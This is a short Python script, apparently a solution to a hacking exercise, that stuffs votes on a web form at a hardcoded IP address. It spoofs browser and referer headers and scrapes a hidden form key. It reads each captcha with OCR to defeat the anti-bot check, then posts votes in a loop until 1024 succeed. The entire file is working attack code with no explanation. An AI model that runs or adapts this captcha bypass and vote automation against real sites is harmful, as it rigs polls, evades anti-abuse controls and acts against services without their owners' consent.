#!/usr/bin/python3

import requests
import pytesseract
import time
import re
from PIL import Image

page = 'http://158.69.76.135/level3.php'
captcha = 'http://158.69.76.135/captcha.php'
my_data = {'id': '930', 'holdthedoor': 'Submit'}
referer = page
u_agent = "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 \
(KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36"
headers = {'User-Agent': u_agent, 'Referer': page}
hecho = 'H'
votos = 1024
Gud = 0
falla = 0
s = requests.Session()
s.headers.update(headers)

while Gud < votos and falla < 100:
    try:
        res = s.get(page, headers=headers)
        if res.status_code is not 200:
            continue
        leter = re.findall("value=\"([^\"]+)\"", res.text)
        if not len(leter):
            continue

        my_data["key"] = leter[0]

        res = s.get(captcha, headers=headers)
        f = open('captcha.png', 'wb')
        f.write(res.content)
        f.close()
        my_data["captcha"] = \
            pytesseract.image_to_string(Image.open('captcha.png'))
        res = s.post(page, data=my_data)
        if res.status_code is 200 and hecho in res.text:
            falla = 0
            Gud += 1
            print("{} hecho!".format(Gud))
    except Exception as e:
        print(e)
        falla += 1

print("por fin: {}/{} votes.".format(Gud, votos))
